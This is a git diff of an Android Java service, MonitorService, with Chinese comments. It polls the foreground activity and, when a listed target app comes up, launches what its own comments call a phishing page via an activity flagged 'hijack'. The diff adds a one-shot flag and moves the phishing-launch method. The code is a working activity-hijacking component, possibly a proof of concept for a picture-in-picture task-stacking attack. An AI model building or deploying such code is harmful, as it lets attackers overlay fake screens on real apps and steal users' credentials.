@@ -14,11 +14,10 @@ import java.util.Calendar;
 public class MonitorService extends Service {
 
     private static final String TAG = "PIPMoveStack";
-
-    private Handler mHandler = null;
-    private static final int POSTDELAYED_COUNTS = 100;
-
-    private static final String[] targetActivityArrays = MonitorList.targetActivityArrays;
+    //监听相关
+    private Handler mHandler = null;                    //监听线程
+    private static final int POSTDELAYED_COUNTS = 100;  //线程运行次数
+    private static final String[] targetActivityArrays = MonitorList.targetActivityArrays;    //目标列表
 
     public MonitorService() {
     }
@@ -32,15 +31,16 @@ public class MonitorService extends Service {
     @Override
     public void onCreate(){
         super.onCreate();
+        final boolean[] isHijack = {false};
         mHandler = new Handler();
         mHandler.post(new Runnable() {
             @Override
             public void run() {
                 //分析进程
                 String fore = getForegroundClassName(getApplicationContext());
-                Log.i(TAG,"Name" + fore);
                 for(String targetActivityArray:targetActivityArrays){
-                    if(targetActivityArray.equals(fore)){
+                    if(targetActivityArray.equals(fore) && !isHijack[0]){
+                        isHijack[0] = true;
                         openPhishingActivity();
                     }
                 }
@@ -49,15 +49,7 @@ public class MonitorService extends Service {
         });
     }
 
-    //打开钓鱼页面
-    private void openPhishingActivity(){
-        Intent Video = new Intent(this, VideoActivity.class);                   //这里直接让Task回到了FS模式
-        Video.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);                                       //没有这段不能挤回FS模式
-        Video.addFlags(Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
-        Video.putExtra("hijack",true);
-        startActivity(Video);
-    }
-
+    //监听前台进程
     public static String getForegroundClassName(Context context) {
         //Get the app record in the last month
         Calendar calendar = Calendar.getInstance();
@@ -76,5 +68,15 @@ public class MonitorService extends Service {
             }
         }
         return className;
+    }
+
+    //打开钓鱼页面
+    private void openPhishingActivity(){
+        mHandler.removeCallbacksAndMessages(null);
+        Intent Video = new Intent(this, VideoActivity.class);                   //这里直接让Task回到了FS模式
+        Video.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);                                       //没有这段不能挤回FS模式
+        Video.addFlags(Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
+        Video.putExtra("hijack",true);
+        startActivity(Video);
     }
 }
